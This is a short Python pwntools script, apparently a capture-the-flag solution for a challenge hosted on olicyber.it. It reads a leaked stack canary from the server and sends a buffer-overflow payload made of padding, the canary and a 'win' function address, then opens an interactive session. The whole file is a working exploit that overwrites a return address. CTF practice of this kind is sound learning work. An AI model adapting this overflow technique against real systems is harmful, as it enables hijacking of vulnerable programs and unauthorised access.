from pwn import *
from Crypto.Util.number import bytes_to_long

#0000000000401715 <- no PIE, indirizzo di win
r = connect("bigbird.challs.olicyber.it", 12006)

r.recvuntil(b": ")
canary = int(r.recvline().decode(), 16)

r.recvline()

mes1 = b"a" * 40
mes2 = b"a" * 8

print(mes1 + p64(canary) + mes2 + p64(0x401715))

r.sendline(mes1 + p64(canary) + mes2 + p64(0x401715))
r.interactive()